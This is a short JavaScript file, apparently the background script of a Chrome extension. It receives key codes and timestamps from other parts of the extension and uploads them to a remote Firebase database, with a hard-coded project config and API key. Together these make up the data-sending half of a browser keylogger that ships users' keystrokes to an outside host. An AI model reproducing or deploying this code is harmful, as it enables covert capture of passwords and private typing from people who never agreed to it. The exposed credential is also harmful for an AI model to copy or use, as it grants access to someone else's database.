// Upload Data to firebase database

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);

function writeClientData(key, time){
    FIREBASEANONA.database().ref().set({
        keyCode: key,
        timeStamp: time
    })
}

function onMessage(request, sender){
    console.log(request.key + "- " + request.time);
    writeClientData(request.key, request.time)
}

chrome.runtime.onMessage.addListener(onMessage);